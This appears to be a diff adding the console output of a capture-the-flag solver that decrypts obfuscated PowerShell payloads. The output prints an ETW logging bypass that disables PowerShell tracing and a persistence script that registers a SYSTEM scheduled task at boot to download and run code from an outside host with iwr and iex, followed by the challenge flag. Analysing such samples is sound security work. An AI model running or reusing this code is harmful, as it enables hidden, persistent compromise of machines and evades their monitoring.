@@ -1,0 +1,76 @@
+C:\Users\jespe\AppData\Local\Programs\Python\Python313\python.exe C:\Users\jespe\PycharmProjects\2026.challenge.fi\Cryptography\Speedrun\decrypt_payload.py
+
+==================================================
+Targeting: req2_decoded.ps1
+Found 1 potential keys and 7 potential payloads.
+==================================================
+[+] Decryption Successful!
+    Payload Variable : $sour
+    Key Variable     : $precision
+    Decrypted Output :
+
+----------------------------------------
+[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)
+----------------------------------------
+
+
+==================================================
+Targeting: req3_decoded.ps1
+Found 1 potential keys and 3 potential payloads.
+==================================================
+[+] Decryption Successful!
+    Payload Variable : $cottage
+    Key Variable     : $cool
+    Decrypted Output :
+
+----------------------------------------
+$TaskName = "ExampleBootTask"
+
+# Define action
+$Action = New-ScheduledTaskAction `
+    -Execute "powershell.exe" `
+    -Argument "-NoProfile -Command `"iwr -UseBasicParsing jolly-heart-a4be.oluf-sand.workers.dev/update/32aebe97-cb2e-4507-a912-9e53e72b9106|iex`""
+
+# Define trigger (at boot)
+$Trigger = New-ScheduledTaskTrigger -AtStartup
+
+# Define principal (SYSTEM account, highest privileges)
+$Principal = New-ScheduledTaskPrincipal `
+    -UserId "SYSTEM" `
+    -LogonType ServiceAccount `
+    -RunLevel Highest
+
+# If task already exists, remove it
+if (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue) {
+    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false
+}
+
+# Register task
+Register-ScheduledTask `
+    -TaskName $TaskName `
+    -Action $Action `
+    -Trigger $Trigger `
+    -Principal $Principal `
+    -Description "Runs a simple PowerShell command at system startup."
+
+Write-Host "Scheduled task '$TaskName' created successfully."
+
+----------------------------------------
+
+
+==================================================
+Targeting: req4_decoded.ps1
+Found 1 potential keys and 9 potential payloads.
+==================================================
+[+] Decryption Successful!
+    Payload Variable : $criminal
+    Key Variable     : $batting
+    Decrypted Output :
+
+----------------------------------------
+$secret = "DDC{l1v1ng_0ff_th3_l4nd_1s_th3_b3st_f34l1ng_dc9ed4584956}"
+
+----------------------------------------
+
+
+Process finished with exit code 0
